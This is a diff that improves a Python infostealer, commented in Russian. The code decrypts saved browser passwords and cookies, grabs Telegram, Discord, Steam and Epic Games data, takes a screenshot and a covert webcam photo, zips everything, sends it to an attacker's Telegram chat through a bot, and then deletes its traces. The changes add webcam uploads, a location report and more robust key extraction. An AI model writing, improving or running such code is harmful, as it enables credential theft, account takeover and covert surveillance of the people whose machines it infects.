@@ -302,18 +302,27 @@ def steal_discord_data():
 def get_encryption_key(profile_path):
     """Получает ключ шифрования для браузера"""
     try:
+        # Ищем файл Local State в родительской папке профиля
         local_state_path = Path(profile_path).parent / "Local State"
         if not local_state_path.exists():
-            return None
+            # Попробуем найти в папке User Data
+            user_data_path = Path(profile_path).parent.parent / "Local State"
+            if user_data_path.exists():
+                local_state_path = user_data_path
+            else:
+                print(f"Файл Local State не найден для {profile_path}")
+                return None
         
         with open(local_state_path, "r", encoding="utf-8") as f:
             local_state = json.loads(f.read())
         
         encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
         encrypted_key = encrypted_key[5:]  # Удалить префикс DPAPI
+        
+        # Исправление опечатки: CryptUnprotectData вместо CryptUnprotectedData
         return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
     except Exception as e:
-        print(f"Ошибка получения ключа шифрования: {e}")
+        print(f"Ошибка получения ключа шифрования для {profile_path}: {e}")
         return None
 
 def decrypt_password(ciphertext, key):
@@ -321,10 +330,13 @@ def decrypt_password(ciphertext, key):
     try:
         if not ciphertext:
             return ""
-            
-        # Для старых версий, защищенных DPAPI
+        
+        # Для старых версий, защищенных только DPAPI
         if isinstance(ciphertext, bytes) and len(ciphertext) > 0 and ciphertext[0] != b'v'[0]:
-            return win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1].decode()
+            try:
+                return win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1].decode()
+            except:
+                return ""
         
         # Для новых версий с AES-GCM
         if key and isinstance(ciphertext, bytes) and len(ciphertext) > 15:
@@ -359,14 +371,13 @@ def steal_browser_data(browser_name, profile_path, data_type):
         
         # Создаем временную копию файла
         temp_db = Path(tempfile.gettempdir()) / f"temp_{data_type}_{browser_name}_{random.randint(1000,9999)}.db"
-        shutil.copy2(db_file, temp_db)
+        shutil.copy2(str(db_file), str(temp_db))
         
         # Получаем ключ шифрования
         key = get_encryption_key(profile_path)
         
         data = []
         conn = sqlite3.connect(str(temp_db))
-        conn.text_factory = bytes  # Для обработки бинарных данных
         cursor = conn.cursor()
         cursor.execute(f"SELECT {columns} FROM {table}")
         
@@ -377,34 +388,37 @@ def steal_browser_data(browser_name, profile_path, data_type):
                     decrypted_pass = decrypt_password(password_value, key)
                     if decrypted_pass:
                         data.append({
-                            'url': url.decode('utf-8', errors='ignore') if url else "",
-                            'username': username.decode('utf-8', errors='ignore') if username else "",
+                            'url': url,
+                            'username': username,
                             'password': decrypted_pass
                         })
                 
                 elif data_type == "cookies":
                     host, name, value, path, expires, secure, encrypted_value = row
                     # Используем encrypted_value если обычное значение пустое
-                    cookie_value = value if value else encrypted_value
+                    cookie_value = encrypted_value if not value else value
                     decrypted_value = decrypt_password(cookie_value, key) if isinstance(cookie_value, bytes) else cookie_value
                     
                     data.append({
-                        'host': host.decode('utf-8', errors='ignore') if host else "",
-                        'name': name.decode('utf-8', errors='ignore') if name else "",
+                        'host': host,
+                        'name': name,
                         'value': decrypted_value,
-                        'path': path.decode('utf-8', errors='ignore') if path else "",
+                        'path': path,
                         'expires': expires,
                         'secure': bool(secure)
                     })
             except Exception as e:
-                print(f"Ошибка обработки записи: {e}")
+                print(f"Ошибка обработки записи {data_type}: {e}")
                 continue
         
         conn.close()
-        temp_db.unlink()  # Удаляем временный файл
+        try:
+            os.remove(str(temp_db))  # Удаляем временный файл
+        except:
+            pass
         return data
     except Exception as e:
-        print(f"Ошибка при краже {data_type} {browser_name}: {e}")
+        print(f"Ошибка при краже {data_type} для {browser_name}: {e}")
         return []
 
 def steal_passwords():
@@ -443,7 +457,7 @@ def steal_passwords():
                     password_file = PASSWORDS_DIR / f"{display_name}_Passwords.json"
                     with open(password_file, 'w', encoding='utf-8') as f:
                         json.dump(passwords, f, indent=4, ensure_ascii=False)
-                        print(f"Пароли {display_name} сохранены")
+                        print(f"Пароли {display_name} сохранены: {len(passwords)} записей")
                 else:
                     print(f"Для {display_name} пароли не найдены")
             except Exception as e:
@@ -487,7 +501,7 @@ def steal_cookies():
                     cookie_file = COOKIE_DIR / f"{display_name}_Cookies.json"
                     with open(cookie_file, 'w', encoding='utf-8') as f:
                         json.dump(cookies, f, indent=4, ensure_ascii=False)
-                        print(f"Куки {display_name} сохранены")
+                        print(f"Куки {display_name} сохранены: {len(cookies)} записей")
                 else:
                     print(f"Для {display_name} куки не найдены")
             except Exception as e:
@@ -583,45 +597,106 @@ def create_zip():
     
     try:
         with zipfile.ZipFile(str(zip_path), 'w', zipfile.ZIP_DEFLATED) as zipf:
+            # Собираем все файлы и папки
             for root, _, files in os.walk(str(BASE_DIR)):
                 for file in files:
                     file_path = Path(root) / file
                     arcname = file_path.relative_to(BASE_DIR)
                     zipf.write(str(file_path), str(arcname))
+                
+            # Гарантируем включение пустых папок
+            empty_folders = [
+                OTHER_DIR,
+                COOKIE_DIR,
+                PASSWORDS_DIR,
+                OTHER_DIR / "Steam",
+                OTHER_DIR / "EpicGames",
+                OTHER_DIR / "Telegram",
+                OTHER_DIR / "Discord"
+            ]
+            
+            for folder in empty_folders:
+                if folder.exists() and folder.is_dir():
+                    # Создаем пустой файл-маркер
+                    marker_file = folder / ".keep"
+                    try:
+                        marker_file.touch(exist_ok=True)
+                        arcname = marker_file.relative_to(BASE_DIR)
+                        zipf.write(str(marker_file), str(arcname))
+                    except Exception as e:
+                        print(f"Не удалось создать маркер для {folder}: {e}")
+            
         return zip_path
     except Exception as e:
         print(f"Ошибка создания архива: {e}")
         return None
 
 def send_to_telegram(zip_path):
-    """Отправляет данные в Telegram"""
+    """Отправляет данные в Telegram в правильной последовательности"""
     try:
-        # Отправляем системную информацию
+        # 1. Отправляем скриншот (если есть)
+        if SCREENSHOT_PATH.exists():
+            with open(str(SCREENSHOT_PATH), 'rb') as photo:
+                bot.send_photo(
+                    chat_id=TELEGRAM_CHAT_ID,
+                    photo=photo,
+                    caption="Скриншот рабочего стола"
+                )
+            time.sleep(1)
+
+        # 2. Отправляем снимок с веб-камеры (если есть)
+        if WEBCAM_PATH.exists():
+            with open(str(WEBCAM_PATH), 'rb') as photo:
+                bot.send_photo(
+                    chat_id=TELEGRAM_CHAT_ID,
+                    photo=photo,
+                    caption="Снимок с веб-камеры"
+                )
+            time.sleep(1)
+
+        # 3. Отправляем краткие сведения о системе
         sys_info = get_system_info()
+        cpu_name = get_cpu_name()
+        cpu_cores = f"{psutil.cpu_count(logical=False)}/{psutil.cpu_count(logical=True)} (физич./логич.)"
+        cpu_usage = f"{psutil.cpu_percent(interval=1)}%"
+        
         summary = (
             "СИСТЕМНЫЙ ОТЧЕТ\n"
             f"• ОС: {sys_info['system']['os']} {sys_info['system']['version']}\n"
             f"• Пользователь: {sys_info['system']['username']}\n"
-            f"• Процессор: {get_cpu_name()}\n"
-            f"• Ядра: {sys_info['hardware']['cpu']['physical_cores']}/{sys_info['hardware']['cpu']['logical_cores']}\n"
+            f"• Процессор: {cpu_name}\n"
+            f"• Ядра: {cpu_cores}\n"
+            f"• Нагрузка: {cpu_usage}\n"
             f"• ОЗУ: {sys_info['hardware']['memory']['total_gb']} GB\n"
             f"• IP: {sys_info['network']['public_ip']}\n"
+            f"• Местоположение: {sys_info['network']['location']}"
         )
         bot.send_message(TELEGRAM_CHAT_ID, summary)
+        time.sleep(1)
+
+        # 4. Проверяем размер архива перед отправкой
+        if not zip_path or not zip_path.exists():
+            bot.send_message(TELEGRAM_CHAT_ID, "Ошибка: архив не создан")
+            return False
         
-        # Отправляем архив
-        if zip_path and zip_path.exists():
-            zip_size = zip_path.stat().st_size / (1024 * 1024)
-            if zip_size <= 50:
-                with open(str(zip_path), 'rb') as f:
-                    bot.send_document(
-                        chat_id=TELEGRAM_CHAT_ID,
-                        document=f,
-                        caption="Полные данные системы",
-                        timeout=120
-                    )
-            else:
-                bot.send_message(TELEGRAM_CHAT_ID, f"Размер архива слишком большой: {zip_size:.2f} МБ")
+        zip_size = zip_path.stat().st_size / (1024 * 1024)  # Размер в МБ
+        
+        if zip_size > 50:
+            bot.send_message(
+                TELEGRAM_CHAT_ID,
+                f"Размер архива превышает 50 МБ ({zip_size:.2f} МБ). "
+                "Данные не будут отправлены."
+            )
+            return False
+
+        # 5. Отправляем архив с данными
+        with open(str(zip_path), 'rb') as f:
+            bot.send_document(
+                chat_id=TELEGRAM_CHAT_ID,
+                document=f,
+                caption="Полные данные системы, куки, пароли и данные приложений",
+                timeout=120
+            )
         return True
     except Exception as e:
         print(f"Ошибка отправки в Telegram: {e}")
@@ -630,39 +705,60 @@ def send_to_telegram(zip_path):
 def cleanup():
     """Очищает следы"""
     try:
+        # Удаляем основную папку с данными
         if BASE_DIR.exists():
             shutil.rmtree(str(BASE_DIR), ignore_errors=True)
+        
+        # Удаляем lock-файл
         if LOCK_FILE.exists():
             LOCK_FILE.unlink()
+            
+        # Удаляем временные файлы
+        for file in Path(tempfile.gettempdir()).iterdir():
+            if file.name.startswith("temp_") and file.name.endswith(".db"):
+                try:
+                    file.unlink()
+                except:
+                    pass
     except:
         pass
 
 def main_workflow():
     """Основной рабочий процесс"""
+    # Гарантированное создание папок
     create_directories()
     
     # Собираем системную информацию
+    sys_info = get_system_info()
     with open(BASE_DIR / "system_report.json", 'w', encoding='utf-8') as f:
-        json.dump(get_system_info(), f, indent=4, ensure_ascii=False)
+        json.dump(sys_info, f, indent=4, ensure_ascii=False)
     
-    # Крадем данные
+    # Крадем куки
     steal_cookies()
+    
+    # Крадем пароли
     steal_passwords()
+    
+    # Крадем данные приложений
     steal_telegram_data()
     steal_discord_data()
     steal_steam_data()
     steal_epic_games_data()
     
-    # Делаем скриншоты
+    # Скриншот
     take_screenshot()
+    
+    # Снимок с веб-камеры
     capture_webcam()
     
-    # Отправляем данные
+    # Упаковываем и отправляем
     zip_file = create_zip()
+    
     if zip_file:
         send_to_telegram(zip_file)
 
 if __name__ == "__main__":
+    # Проверка блокировки
     if LOCK_FILE.exists():
         sys.exit()
     
